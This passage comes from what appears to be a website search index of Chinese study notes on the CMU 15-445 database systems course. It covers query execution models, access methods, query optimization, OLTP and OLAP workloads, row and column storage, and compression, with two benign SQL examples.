\u65b9\u6cd5\u66f4\u4e3a\u5e38\u89c1\uff0c\u4f46 bottom-to-top \u80fd\u66f4\u597d\u63a7\u5236\u6d41\u6c34\u7ebf</p> <p>Iterator Model</p> <p>\u8fed\u4ee3\u5668\u6a21\u578b\uff0c\u4e5f\u88ab\u79f0\u4e3a Volcano \u6216 Pipeline \u6a21\u578b\uff0c\u662f\u6700\u5e38\u89c1\u7684\u5904\u7406\u6a21\u578b\u3002</p> <p>\u5176\u5de5\u4f5c\u539f\u7406\u662f\u4e3a\u6570\u636e\u5e93\u6bcf\u4e2a\u8fd0\u7b97\u7b26\u5b9e\u73b0\u4e00\u4e2a <code>Next</code> \u51fd\u6570\u3002Query Plan \u4e2d\u7684\u6bcf\u4e2a\u8282\u70b9\u90fd\u4f1a\u5bf9\u5176\u5b50\u8282\u70b9\u8c03\u7528 <code>Next</code> \u8fed\u4ee3\uff0c\u76f4\u5230\u5230\u8fbe\u53f6\u8282\u70b9\uff0c\u6700\u540e\u4ece\u53f6\u8282\u70b9\u5f00\u59cb\u5c06 tuple \u53d1\u9001\u5230\u7236\u8282\u70b9\u8fdb\u884c\u5904\u7406\u3002\u8fd9\u5728\u57fa\u4e8e\u78c1\u76d8\u7684\u6570\u636e\u5e93\u7cfb\u7edf\u4e2d\u662f\u975e\u5e38\u6709\u6548\u7684\u3002</p> <p></p> <p>\u8fed\u4ee3\u5668\u6a21\u578b\u5141\u8bb8\u6d41\u6c34\u7ebf\uff0c\u5176\u4e2d DBMS \u53ef\u4ee5\u5728\u5fc5\u987b\u68c0\u7d22\u4e0b\u4e00\u4e2a\u5143\u7ec4\u524d\u7528\u5c3d\u53ef\u80fd\u591a\u7684\u8fd0\u7b97\u7b26\u6765\u5904\u7406\u5143\u7ec4\u3002</p> <p><code>join</code>,<code>subqueries</code>,<code>order</code> \u7b49\u8fd0\u7b97\u7b26\u5728\u6536\u5230\u5b50\u8282\u70b9\u8fd4\u56de\u7684\u5143\u7ec4\u524d\u4f1a\u963b\u585e\uff0c\u5b83\u4eec\u88ab\u79f0\u4e3a Pipeline Breakers</p> <p>\u5bf9\u4e8e Output Control\uff08\u5982 <code>LIMIT</code>\uff09\uff0c\u4e00\u65e6\u5f97\u5230\u6240\u9700\u7684\u6240\u6709 tuples\uff0c\u5c31\u53ef\u4ee5\u505c\u6b62\u8c03\u7528 <code>Next</code> \u4e86\u3002</p> <p>Materialization Model</p> <p>\u7269\u5316\u6a21\u578b\u662f\u8fed\u4ee3\u5668\u6a21\u578b\u7684\u4e00\u79cd\u7279\u6b8a\u60c5\u51b5\uff0c\u6bcf\u4e2a Operator \u4e00\u6b21\u5904\u7406\u6240\u6709\u8f93\u5165\uff0c\u5904\u7406\u5b8c\u540e\u5c06\u7ed3\u679c\u4e00\u6b21\u6027\u8f93\u51fa\u3002</p> <p></p> <p>\u8fd9\u79cd\u5904\u7406\u65b9\u5f0f\u66f4\u9002\u5408 OLTP \u5de5\u4f5c\u8d1f\u8f7d\uff0c\u56e0\u4e3a\u67e5\u8be2\u901a\u5e38\u4e00\u6b21\u53ea\u8bbf\u95ee\u5c11\u91cf\u5143\u7ec4\uff0c\u51fd\u6570\u8c03\u7528\u4e5f\u5c31\u66f4\u5c11\u3002\u800c\u5176\u4e0d\u9002\u5408 OLAP \u5de5\u4f5c\u8d1f\u8f7d\uff0c\u56e0\u4e3a\u4e2d\u95f4\u7684\u6682\u5b58\u7ed3\u679c\u53ef\u80fd\u4f1a\u6ea2\u51fa\u5230\u78c1\u76d8\u4e0a\uff0c\u5e26\u6765\u8f83\u5927 I/O \u5f00\u9500\u3002</p> <p>Vectorization Model</p> <p>\u4e0e\u8fed\u4ee3\u5668\u6a21\u578b\u4e00\u6837\uff0c\u77e2\u91cf\u5316\u6a21\u578b\u4e5f\u4e3a\u6bcf\u4e00\u4e2a\u8fd0\u7b97\u7b26\u5b9e\u73b0\u4e00\u4e2a <code>Next</code> \u51fd\u6570\uff0c\u4f46\u662f\u4e00\u6b21\u6027\u5904\u7406 \\(n\\) \u4e2a\u6570\u636e\u3002</p> <p>n \u7684\u5927\u5c0f\u89c6\u786c\u4ef6\u548c\u67e5\u8be2\u5c5e\u6027\u800c\u5f02</p> <p></p> <p>\u77e2\u91cf\u5316\u6a21\u578b\u65b9\u6cd5\u975e\u5e38\u9002\u5408\u5fc5\u987b\u626b\u63cf\u5927\u91cf\u5143\u7ec4\u7684 OLAP \u5de5\u4f5c\u8d1f\u8f7d\uff0c\u5b83\u5bf9 <code>Next</code> \u51fd\u6570\u7684\u8c03\u7528\u6b21\u6570\u8f83\u5c11\u3002</p>"},{"location":"Accumulation/CMU15-445/Query%20Execution/#access-methods","title":"Access Methods","text":"<p>\u8bbf\u95ee\u65b9\u6cd5\u662f DBMS \u8bbf\u95ee\u5b58\u50a8\u5728 Table \u4e2d\u6570\u636e\u7684\u65b9\u5f0f\uff0c\u901a\u5e38\u6709 Sequential Scan \u548c Index Scan \u4e24\u79cd\u3002</p> <ul> <li>Sequential Scan<ul> <li>\u7ef4\u62a4\u4e00\u4e2a\u5185\u90e8\u6e38\u6807\uff0c\u5e76\u4e14\u8ddf\u8e2a\u5b83\u8bbf\u95ee\u7684\u4e0a\u4e00\u4e2a Page/Slot</li> <li>\u987a\u5e8f\u626b\u63cf\u4e00\u822c\u662f DBMS \u67e5\u8be2\u6548\u7387\u6700\u4f4e\u7684\u64cd\u4f5c\uff0c\u53ef\u4ee5\u4f7f\u7528 Prefetching, Buffer Pool Bypass, Parallelization, Late Materialization, Heap Clustering, Approximate Queries, Zone Map \u7b49\u7b56\u7565\u8fdb\u884c\u4f18\u5316</li> </ul> </li> <li>Index Scan<ul> <li>\u4f8b\u5982\uff0c\u5728\u5bf9\u4e0b\u9762\u4e00\u4e2a\u5177\u6709\u4e24\u4e2a\u7d22\u5f15\u7684\u8868\u8fdb\u884c\u7d22\u5f15\u626b\u63cf\uff0c\u6700\u597d\u5728\u626b\u63cf\u4e2d\u9009\u7528 <code>dept</code>\uff0c\u56e0\u4e3a\u9009 <code>age</code> \u7684\u8bdd\u8fd8\u8981\u626b\u63cf\u4e00\u904d <code>age</code> \u7d22\u5f15\uff0c\u4e0d\u6bd4\u987a\u5e8f\u626b\u63cf\u5feb\u591a\u5c11\u3002</li> <li></li> <li>\u5f53\u7136\uff0c\u4e0a\u56fe\u5176\u5b9e\u91c7\u7528\u4e86\u591a\u7d22\u5f15\u626b\u63cf\uff0c\u5148\u5c06\u4e24\u4e2a\u7d22\u5f15\u53d6\u51fa\u76f8\u5e94\u7684 ID \u96c6\uff0c\u7136\u540e\u53d6\u4ea4\u96c6\u7ee7\u7eed\u64cd\u4f5c</li> </ul> </li> </ul>"},{"location":"Accumulation/CMU15-445/Query%20Execution/#modification-queries-expression-evalution","title":"Modification Queries &amp; Expression Evalution","text":"<p>\u6446\u4e86\uff0c\u8bf7\u770b Lecture 12: Query Execution I</p>"},{"location":"Accumulation/CMU15-445/Query%20Execution/#query-plan-optimization","title":"Query Plan Optimization","text":"<p>\u5bf9\u4e8e\u540c\u4e00\u4e2a SQL \u67e5\u8be2\u8bed\u53e5\uff0c\u53ef\u4ee5\u8f6c\u6362\u4e3a\u5177\u6709\u4e0d\u540c\u6027\u80fd\u7684 Query Plan\uff0c\u4e3a\u6b64\u4eba\u4eec\u8bbe\u8ba1\u4e86 Query Optimizer \u9009\u62e9\u6700\u4f73\u7684\u67e5\u8be2\u8ba1\u5212\u3002</p> <p>\u67e5\u8be2\u4f18\u5316\u5668\u7684\u7b2c\u4e00\u4e2a\u5b9e\u73b0\u662f IBM System R\uff0c\u5176\u8bb8\u591a\u6982\u5ff5\u548c\u51b3\u7b56\u81f3\u4eca\u4ecd\u5728\u4f7f\u7528</p> <p>\u67e5\u8be2\u4f18\u5316\u6709\u4e24\u79cd\u9ad8\u7ea7\u7b56\u7565\uff1a</p> <ul> <li>Static Rules, or Heuristics<ul> <li>\u5c06 Query Plan \u548c\u5df2\u77e5\u90e8\u5206\u5339\u914d\uff0c\u6839\u636e\u9759\u6001\u89c4\u5219\u8f6c\u6362\u67e5\u8be2\u4ee5\u4fdd\u8bc1\u8d77\u7801\u4e0d\u4f1a\u4f4e\u6548\u3002</li> <li>\u8fd9\u4e9b\u9759\u6001\u89c4\u5219\u53ef\u80fd\u9700\u8981\u67e5\u9605 index \u5e76\u4e86\u89e3\u6570\u636e\u7ed3\u6784\uff0c\u4f46\u662f\u4e0d\u9700\u8981\u68c0\u67e5\u6570\u636e\u672c\u8eab</li> </ul> </li> <li>Cost-Based Search<ul> <li>\u4f7f\u7528\u6210\u672c\u6a21\u578b\u6765\u4f30\u8ba1\u67e5\u8be2\u8ba1\u5212\u7684\u6210\u672c\uff0c\u9009\u62e9\u6210\u672c\u6700\u4f4e\u7684 Query Plan</li> </ul> </li> </ul> <p>\u5177\u4f53\u8bf7\u770b https://15445.courses.cs.cmu.edu/fall2022/notes/14-optimization.pdf</p>"},{"location":"Accumulation/CMU15-445/Storage%20Model/","title":"4. Storage Model & Compression","text":""},{"location":"Accumulation/CMU15-445/Storage%20Model/#4-storage-model-compression","title":"4. Storage Model &amp; Compression","text":"<p> \u7ea6 1296 \u4e2a\u5b57  9 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p>"},{"location":"Accumulation/CMU15-445/Storage%20Model/#database-workloads","title":"Database Workloads","text":"<p>OLTP: Online Transaction Processing</p> <p>OLTP \u5de5\u4f5c\u8d1f\u8f7d\u7684\u7279\u70b9\u662f\u5feb\u901f\u4e14\u77ed\u65f6\u95f4\u8fd0\u884c\u7684\u64cd\u4f5c\u3001\u5355\u6b65\u5bf9\u5355\u4e2a\u5bf9\u8c61\u8fdb\u884c\u64cd\u4f5c\u7684\u7b80\u5355\u8bf7\u6c42\u3001\u4ee5\u53ca\u91cd\u590d\u64cd\u4f5c\u3002</p> <p>\u7b80\u5355\u6765\u8bf4 OLTP \u5c31\u662f\u4e00\u4e9b\u7b80\u5355\u7684\u8bf7\u6c42\uff0c\u5b83\u4eec\u53ea\u4f1a\u8bfb\u5199\u5355\u4e2a\u5bf9\u8c61\u4e4b\u4e2d\u5f88\u5c11\u7684\u6570\u636e\uff0c\u4f8b\u5982\uff1a</p> <pre><code>SELECT P.*, R.*\nFROM pages AS P INNER JOIN revisions AS R\nON P.latest = R.revID\nWHERE P.pageID = 65576;\n</code></pre> <p>OLAP: Online Analytical Processing</p> <p>OLAP \u5c06\u4f1a\u662f\u590d\u6742\u7684\u8bf7\u6c42\uff0c\u5b83\u4eec\u5c06\u5c1d\u8bd5\u4ece\u5df2\u7ecf\u6536\u96c6\u7684\u73b0\u6709\u6570\u636e\u5e93\u6570\u636e\u4e2d\u63a8\u65ad\u51fa\u65b0\u7684\u4fe1\u606f\u3002</p> <p>\u4f8b\u5982\uff0c\u4ee5\u4e0b\u8bf7\u6c42\u5c1d\u8bd5\u627e\u51fa\u6240\u6709\u4ee5 <code>.zju.edu.cn</code> \u90ae\u7bb1\u7ed3\u5c3e\u767b\u5f55\u7684\u4eba\uff1a</p> <pre><code>SELECT COUNT(U.lastlogin),\n    EXTRACT(month FROM U.lastlogin) AS month\nFROM useracct AS U\nWHERE U.hostname LIKE '%.zju.edu.cn'\nGROUP BY EXTRACT(month FROM U.lastlogin);\n</code></pre> <p>\u5728 OLAP \u5de5\u4f5c\u4e2d\uff0c\u6570\u636e\u5e93\u7cfb\u7edf\u5c06\u5206\u6790\u4ece OLTP \u7aef\u6536\u96c6\u7684\u73b0\u6709\u6570\u636e\u3002</p> <p>\u4e00\u4e2a\u5f62\u8c61\u7684\u4f8b\u5b50</p> <p>\u5728 Amazon \u9875\u9762\uff0c\u7528\u6237\u5c06\u5546\u54c1\u6dfb\u52a0\u5230\u4ed6\u4eec\u7684\u8d2d\u7269\u8f66\uff0c\u8fd9\u4e9b\u64cd\u4f5c\u53ea\u4f1a\u5f71\u54cd\u81ea\u5df1\u7684\u8d26\u6237\uff0c\u5c5e\u4e8e OLTP\uff1b\u4f46\u662f Amazon \u5982\u679c\u8981\u7edf\u8ba1\u4e0b\u96e8\u5929\u8d2d\u4e70\u91cf\u6700\u591a\u7684\u5546\u54c1\uff0c\u8fd9\u5c5e\u4e8e OLAP \u5de5\u4f5c\u8d1f\u8f7d\u3002</p> <p>HTAP: Hybrid Transaction + Analytical Processing</p> <p>\u4e00\u79cd\u65b0\u578b\u5de5\u4f5c\u8d1f\u8f7d\uff0c\u5b83\u5c1d\u8bd5\u5728\u540c\u4e00\u4e2a\u6570\u636e\u5e93\u4e0a\u540c\u65f6\u6267\u884c OLTP \u548c OLAP\u3002</p>"},{"location":"Accumulation/CMU15-445/Storage%20Model/#storage-models","title":"Storage Models","text":"<p>Storage Model \u5c31\u662f\u6570\u636e\u5e93\u7cfb\u7edf\u8868\u793a\u5143\u7ec4\u7684\u65b9\u5f0f\u3002</p>"},{"location":"Accumulation/CMU15-445/Storage%20Model/#n-ary-storage-model-nsm","title":"N-Ary Storage Model (NSM)","text":"<p>N-Ary \u5b58\u50a8\u6a21\u578b\u5c31\u662f\u6211\u4eec\u4e4b\u524d\u4e00\u76f4\u4f5c\u4e3a\u4f8b\u5b50\u7684\u6a21\u578b\uff1a</p> <p></p> <p>\u5b83\u5f80\u5f80\u53ea\u5bf9\u4e00\u4e2a\u5bf9\u8c61\u8fdb\u884c\u64cd\u4f5c\uff0c\u56e0\u4e3a\u53ea\u9700\u8981\u4e00\u6b21 fetch \u5c31\u80fd\u83b7\u53d6\u5355\u4e2a tuple \u7684\u5168\u90e8\u5c5e\u6027\u3002\u8fd9\u79cd\u6a21\u578b\u975e\u5e38\u9002\u5408 OLTP \u8d1f\u8f7d\u3002</p> <p>\u4f46\u662f\u5982\u679c\u6211\u4eec\u9700\u8981\u5bf9\u5176\u8fdb\u884c OLAP \u67e5\u8be2\u7b49\u626b\u63cf\u4e00\u4e2a\u8f83\u5927\u5b50\u96c6\u64cd\u4f5c\uff0c\u83b7\u53d6\u5230\u7684\u7ed3\u679c\u5305\u542b\u6bcf\u4e00\u4e2a tuple \u7684\u5168\u90e8\u5c5e\u6027\uff0c\u800c\u6211\u4eec\u53ef\u80fd\u53ea\u9700\u8981\u5176\u4e2d\u7684\u4e00\u5c0f\u90e8\u5206\uff0c\u5bfc\u81f4\u65e0\u7528\u7684 I/O \u6d88\u8017\u8fc7\u591a\u3002</p>"},{"location":"Accumulation/CMU15-445/Storage%20Model/#decomposition-storage-model-dsm","title":"Decomposition Storage Model (DSM)","text":"<p>DSM \u5219\u5c06\u5355\u4e2a\u5c5e\u6027\uff08\u6216\u8005col\uff09\u8fde\u7eed\u5b58\u50a8\u5728\u540c\u4e00\u4e2a page \u4e2d\uff0c\u56e0\u6b64\uff0c\u5b83\u4e5f\u88ab\u79f0\u4e3a column store(\u5217\u5b58\u50a8)\u3002</p> <p></p> <p>\u6b64\u6a21\u578b\u975e\u5e38\u9002\u5408\u8fdb\u884c\u8bb8\u591a\u53ea\u8bfb\u67e5\u8be2\u7684 OLAP \u8d1f\u8f7d\u3002</p> <p>\u4e3a\u4e86\u80fd\u5c06\u5404\u4e2a Page \u4e2d\u7684\u5c5e\u6027\u5bf9\u9f50\u5230\u540c\u4e00\u4e2a\u5143\u7ec4\u4e0a\u8fd8\u9700\u8981\u8fdb\u884c\u4e00\u4e9b\u989d\u5916\u7684\u7b56\u7565\uff1a</p> <ul> <li>Choice 1: Fixed-length Offsets<ul> <li>\u5404\u4e2a\u5c5e\u6027\u90fd\u7b49\u957f\uff0c\u8fd9\u6837\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u76f8\u540c\u7684 offset \u8c03\u7528\u540c\u4e00\u4e2a tuple \u7684\u5c5e\u6027</li> </ul> </li> <li>Choice 2: Embedded Tuple ID<ul> <li>\u5728 Page \u4e2d\u4e3a\u5c5e\u6027\u5185\u5d4c\u4e00\u4e2a ID\uff0c\u8fd9\u6837\u53ef\u4ee5\u901a\u8fc7 ID \u6765\u8c03\u7528</li> </ul> </li> </ul>"},{"location":"Accumulation/CMU15-445/Storage%20Model/#database-compression","title":"Database Compression","text":"<p>\u538b\u7f29\u5e7f\u6cdb\u5e94\u7528\u4e8e\u57fa\u4e8e\u78c1\u76d8\u7684 DBMS\uff0c\u56e0\u4e3a\u6211\u4eec\u9700\u8981\u5c3d\u53ef\u80fd\u7f29\u5c0f I/O \u5f00\u9500\u8fd9\u4e2a\u6027\u80fd\u74f6\u9888\u3002</p> <p>\u5c24\u5176\u662f\u5728\u53ea\u8bfb\u5de5\u4f5c\u7684\u8d1f\u8f7d\u4e2d\uff0c\u5982\u679c DBMS \u5df2\u7ecf\u4e8b\u5148\u538b\u7f29\uff0c\u5219\u53ef\u4ee5\u83b7\u53d6\u66f4\u591a\u6709\u7528\u7684 tuples\uff0c\u4f46\u540c\u65f6\u9700\u8981\u66f4\u5927\u7684\u538b\u7f29\u3001\u89e3\u538b\u8ba1\u7b97\u5f00\u9500\u3002</p> <p>\u5982\u679c\u6570\u636e\u96c6\u662f\u5b8c\u5168\u968f\u673a\u7684\u6570\u503c\u4f4d\uff0c\u90a3\u6211\u4eec\u4e0d\u80fd\u5bf9\u5176\u8fdb\u884c\u538b\u7f29\u3002\u4f46\u662f\u4e00\u822c\u7684\u6570\u636e\u96c6\u53ef\u80fd\u5177\u6709\u4ee5\u4e0b\u4e24\u4e2a\u5c5e\u6027\uff1a</p> <ul> <li>&lt;1&gt; \u5c5e\u6027\u503c\u5177\u6709\u9ad8\u5ea6\u503e\u659c\u5206\u5e03<ul> <li>\u4f8b\u5982\uff0c\u5bf9\u82f1\u6587\u8bed\u8a00\u8fdb\u884c\u8bcd\u9891\u7edf\u8ba1\uff0c\u4f7f\u7528\u6700\u591a\u7684\u662f <code>the</code></li> </ul> </li> <li>&lt;2&gt; \u540c\u4e00\u5143\u7ec4\u7684\u4e24\u4e2a\u5c5e\u6027\u5177\u6709\u9ad8\u5ea6\u76f8\u5173\u6027<ul> <li>\u4f8b\u5982\uff0c\u540c\u4e00\u4e2a\u57ce\u5e02\u7684\u90ae\u653f\u7f16\u7801\u662f\u76f8\u540c\u7684</li> </ul> </li> </ul> <p>\u5bf9\u4e8e\u538b\u7f29\u5b8c\u7684\u6570\u636e\uff0c\u6211\u4eec\u6709\u4ee5\u4e0b\u4e09\u70b9\u76ee\u6807\uff1a</p> <ul> <li>&lt;1&gt; \u538b\u7f29\u540e\u7684\u503c\u7b49\u957f\uff0c\u65b9\u4fbf\u901a\u8fc7 offset \u5f15\u7528<ul> <li>\u5bf9\u4e8e\u975e\u5b9a\u957f\u6570\u636e\uff0c\u5c06\u5176\u653e\u5230\u989d\u5916\u7684 pool \u4e2d\uff0c\u7ef4\u62a4\u6307\u5411\u5b83\u4eec\u7684\u6307\u9488</li> </ul> </li> <li>&lt;2&gt; \u5728\u67e5\u8be2\u8fc7\u7a0b\u4e2d\u5c3d\u53ef\u80fd\u665a\u5730\u89e3\u538b\u7f29<ul> <li>\u7406\u60f3\u60c5\u51b5\u662f\uff0c\u6211\u4eec\u7684 DBMS \u80fd\u76f4\u63a5\u5728\u538b\u7f29\u540e\u7684\u6570\u636e\u4e0a\u8fd0\u884c</li> </ul> </li> <li>&lt;3&gt; \u5fc5\u987b\u662f\u65e0\u635f\u65b9\u6848</li> </ul>"},{"location":"Accumulation/CMU15-445/Storage%20Model/#naive-compression","title":"Naive Compression","text":"<p>\u6734\u7d20\u538b\u7f29\u662f\u5728 Block-Level \u4e0a\u8fdb\u884c\u538b\u7f29\uff0c\u5373 Compress a block of tuples for the same table.</p> <p>\u8fd9\u91cc\u7684 Naive \u610f\u4e3a\u6570\u636e\u5e93\u7cfb\u7edf\u4e0d\u80fd\u7406\u89e3\u538b\u7f29\u540e\u6570\u636e\u7684\u542b\u4e49</p> <p>DBMS \u4f7f\u7528\u901a\u7528\u7b97\u6cd5\uff08gzip, LZO, LZ4, Snappy, Brotli, Oracle OZIP, Zstd \u7b49\uff09\u538b\u7f29\u6570\u636e\uff0c\u5de5\u7a0b\u5e08\u4e00\u822c\u503e\u5411\u4e8e\u4f7f\u7528\u538b\u7f29\u7387\u66f4\u4f4e\u4f46\u662f\u538b\u7f29/\u89e3\u538b\u66f4\u5feb\u7684\u7b97\u6cd5\u3002</p> <p>\u4f7f\u7528 Naive Compression \u7684\u4e00\u4e2a\u4f8b\u5b50\u662f MySQL InnoDB\u3002\u5b83\u5c06\u4e00\u4e2a 16KB \u7684 Page \u538b\u7f29\u4e3a 1,2,4,8 KB \u5927\u5c0f\u7684 Compressed Page\u3002\u5f53\u6211\u4eec\u9700\u8981\u5bf9\u5185\u90e8\u7684 tuple \u8fdb\u884c\u8bfb\u53d6\u65f6\uff0c\u5c06\u8be5 Compressed Page \u8bfb\u53d6\u5230 Buffer \u4e2d\uff0c\u7136\u540e\u8fdb\u884c\u89e3\u538b\u7f29\u3002\u6b64\u65f6\uff0cBuffer Pool \u4e2d\u65e2\u6709\u538b\u7f29\u540e\u7684 Page \u4e5f\u6709\u89e3\u538b\u540e\u7684 Page\u3002</p> <p>\u4e00\u4e2a\u91cd\u8981\u7f3a\u70b9\u662f\uff0c\u8fd9\u4e9b\u6734\u7d20\u7684\u538b\u7f29\u65b9\u6848\u6ca1\u6709\u8003\u8651\u6570\u636e\u7684\u9ad8\u7ea7\u542b\u4e49\u6216\u8bed\u4e49\uff0cDBMS \u65e0\u6cd5\u5224\u65ad\u6570\u636e\u7684\u89e3\u538b\u7f29\u80fd\u63a8\u8fdf\u5230\u591a\u665a\u8fdb\u884c\u3002</p>"},{"location":"Accumulation/CMU15-445/Storage%20Model/#columnar-compression","title":"Columnar Compression","text":"<ul> <li>&lt;1&gt; Run-Length Encoding<ul> <li>\u5bf9\u91cd\u590d\u3001\u8fde\u7eed\u7684\u5c5e\u6027\u8fdb\u884c\u805a\u7c7b\u3002\u901a\u5e38\u9700\u8981 DBMS \u4e8b\u5148\u5bf9\u5176\u8fdb\u884c\u667a\u80fd\u6392\u5e8f\u3002</li> <li>\u4f8b\u5982\uff0c\u5047\u5982\u6709\u4e00\u6027\u522b\u5217\uff1a<code>MMMFMFF</code> \uff0c\u538b\u7f29\u540e\u4e3a <code>M&lt;0,3&gt;, F&lt;3,1&gt;, M&lt;4,1&gt;, F&lt;5,2&gt;</code></li> </ul> </li> <li>&lt;2&gt; Bit-Packing Encoding<ul> <li>\u4f8b\u5982\uff0c\u5bf9\u4e8e\u4e00\u5217 <code>int64</code> \u6570\u636e\uff0c\u5982\u679c\u5b83\u4eec\u90fd\u53ea\u7528\u5230\u4e86\u524d\u516b\u4f4d\uff0c\u53ef\u4ee5\u5c06\u5b83\u4eec\u538b\u7f29\u4e3a <code>int8</code></li> </ul> </li> <li>&lt;3&gt; Mostly Encoding<ul> <li>\u5bf9 mostly \u60c5\u51b5\u8fdb\u884c Bit-Packing Encoding \u6216\u5176\u5b83\u7f16\u7801\uff0c\u628a\u5f02\u5e38\u503c\u5355\u72ec\u62ff\u51fa\u4f5c lookup table</li> <li></li> </ul> </li> <li>&lt;4&gt; Bitmap Encoding<ul> <li>DBMS \u4e3a\u7279\u5b9a\u5c5e\u6027\u7684\u6bcf\u4e00\u79cd\u503c\u90fd\u8bbe\u7f6e\u4e00\u4e2a Bitmap</li> </ul> </li> <li>&lt;5&gt; Delta Encoding<ul> <li></li> </ul> </li> <li>&lt;6&gt; Incremental Encoding<ul> <li>\u989d\u5916\u7ef4\u62a4\u4e00\u4e2a\u4e0e\u524d\u4e00\u4e2a\u503c\u76f8\u540c\u7684\u524d\u7f00\u7684\u957f\u5ea6</li> <li></li> </ul> </li> <li>&lt;7&gt; Dictionary Compression<ul> <li>\u5b57\u5178\u538b\u7f29\u662f\u6700\u5e38\u7528\u7684\u6570\u636e\u5e93\u538b\u7f29\u65b9\u6848\uff0c\u5e76\u4e14\u8fdb\u884c\u6570\u636e\u67e5\u8be2\u65f6\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u7f16\u7801\u540e\u7684 code\uff0c\u4e0d\u9700\u8981\u89e3\u538b\uff08\u6570\u5b57\u7684\u6bd4\u8f83\u4e5f\u901a\u5e38\u6bd4\u5b57\u7b26\u4e32\u7684\u5339\u914d\u66f4\u5feb\uff09\u3002</li> <li></li> </ul> </li> </ul>"},{"location":"Accumulation/CMU15-445/Storage/","title":"3. Database Storage","text":""},{"location":"Accumulation/CMU15-445/Storage/#3-database-storage","title":"3. Database Storage","text":"<p> \u7ea6 1625 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p>"},{"location":"Accumulation/CMU15-445/Storage/#overview","title":"Overview","text":"<p>\u6b63\u5982\u6211\u4eec\u5728\u5176\u5b83\u8bfe\u7a0b\u4e2d\u5b66\u5230\u7684\uff0c\u8ba1\u7b97\u673a\u7684\u5b58\u50a8\u7ed3\u6784\u4f53\u7cfb\u53ef\u5212\u5206\u4e3a\uff1a</p> <p></p> <p>\u800c\u6570\u636e\u5e93\u4e00\u822c\u5b58\u50a8\u4e8e\u975e\u6613\u5931\u6027\u534a\u5bfc\u4f53\u4e2d\uff0c\u5728\u8fd9\u79cd\u5b58\u50a8\u4e0b\uff0c\u987a\u5e8f\u8bbf\u95ee\u901a\u5e38\u6bd4\u968f\u673a\u8bbf\u95ee\u5feb\u5f97\u591a\u3002</p> <p>\u8fd9\u4e5f\u8981\u6c42\u6211\u4eec\u5728\u7b97\u6cd5\u4e0a\u6700\u5927\u5316\u987a\u5e8f\u8bbf\u95ee\u7684\u6bd4\u4f8b\u4ee5\u83b7\u5f97\u66f4\u597d\u7684\u6027\u80fd\u8868\u73b0</p> <p>\u56e0\u4e3a\u7cfb\u7edf\u65e0\u6cd5\u76f4\u63a5\u5728\u78c1\u76d8\u4e0a\u64cd\u4f5c\u6570\u636e\uff0c\u6211\u4eec\u7684 DBMS \u67b6\u6784\u8981\u8d1f\u8d23\u5f04\u6e05\u695a\u5982\u4f55\u5728\u975e\u6613\u5931\u6027\u78c1\u76d8\u548c\u6613\u5931\u6027 Memory \u4e2d\u79fb\u52a8\u6570\u636e\u3002</p> <p>\u5728\u9762\u5411\u78c1\u76d8\u7684 DBMS \u4e2d\uff0c\u6570\u636e\u5e93\u5168\u90e8\u4f4d\u4e8e\u78c1\u76d8\u4e0a\uff0c\u6587\u4ef6\u4e2d\u7684\u6570\u636e\u88ab\u7ec4\u7ec7\u6210\u591a\u4e2a Page\uff0c\u5176\u4e2d\u7b2c\u4e00\u4e2a Page \u4e3a index\u3002</p> <p></p> <p>\u8981\u5bf9\u6570\u636e\u8fdb\u884c\u64cd\u4f5c\uff0cDBMS \u9700\u8981\u5c06\u6570\u636e\u4ece\u78c1\u76d8\u8f6c\u5165\u5185\u5b58\u4e2d\uff0c\u5b83\u901a\u8fc7\u4e00\u4e2a\u7f13\u51b2\u6c60\u6765\u7ba1\u7406\u78c1\u76d8\u548c\u5185\u5b58\u4e4b\u95f4\u6570\u636e\u79fb\u52a8\u3002\u4e0a\u5c42\u7684 Execution Engine \u4f1a\u6839\u636e\u5177\u4f53\u64cd\u4f5c\u5411\u7f13\u51b2\u6c60\u8bf7\u6c42\u7279\u5b9a Page\uff0c\u7f13\u51b2\u6c60\u8d1f\u8d23\u5c06\u8be5 Page \u653e\u5165\u5185\u5b58\uff0c\u5e76\u63d0\u4f9b\u6307\u5411\u5185\u5b58\u4e2d\u8be5 Page \u7684\u4e00\u4e2a\u6307\u9488\u3002</p> <p>\u5e38\u89c1 DBMS \u4e2d\uff0c\u9664\u4e86 SQLite \u662f\u5355\u6587\u4ef6\uff0c\u5176\u5b83\u5747\u4e3a\u591a\u6587\u4ef6</p>"},{"location":"Accumulation/CMU15-445/Storage/#memory-mapped-io","title":"Memory Mapped I/O","text":"<p>\u4e3a\u4e86\u5b9e\u73b0\u66f4\u9ad8\u6027\u80fd\u5730\u6570\u636e\u5e93\u64cd\u4f5c\uff0c\u6211\u4eec\u5e0c\u671b\u4e3a\u5176\u8bbe\u8ba1\u4e00\u4e2a\u66f4\u7b26\u5408\u5176\u64cd\u4f5c\u7279\u6027\u7684\u989d\u5916\u7cfb\u7edf\u3002\u5728\u6570\u636e\u5e93\u7cfb\u7edf\u5185\u90e8\uff0c\u603b\u662f\u80fd\u591f\u4f5c\u51fa\u6bd4\u76f4\u63a5\u4f7f\u7528\u64cd\u4f5c\u7cfb\u7edf\u66f4\u597d\u7684\u7b56\u7565\u3002</p> <p>\u6211\u4eec\u53ea\u5e0c\u671b\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u8db3\u591f\u7684 Memory \u5e76\u4e14\u4fdd\u8bc1\u8fdb\u7a0b\u4e0d\u4f1a\u88ab\u4e2d\u65ad\uff0c\u6240\u6709\u7684\u64cd\u4f5c\u90fd\u5e94\u8be5\u5728\u6570\u636e\u5e93\u7cfb\u7edf\u5185\u90e8\u5b8c\u6210\u3002</p> <p>DBMS \u7684\u4e0a\u5c42\u8bbe\u8ba1\u76ee\u6807\u662f\u652f\u6301\u8d85\u51fa\u53ef\u7528\u5185\u5b58\u91cf\u7684\u6570\u636e\u5e93\u3002\u8fd9\u81ea\u7136\u800c\u7136\u8ba9\u6211\u4eec\u60f3\u8d77\u4e86 OS \u4e2d\u865a\u62df\u5185\u5b58\u7684\u5e94\u7528\uff0c\u5728 DBMS \u4e2d\u5b9e\u73b0\u8fd9\u4e00\u7c7b\u4f3c\u7b56\u7565\u7684\u65b9\u6cd5\u662f\u4f7f\u7528 mmap 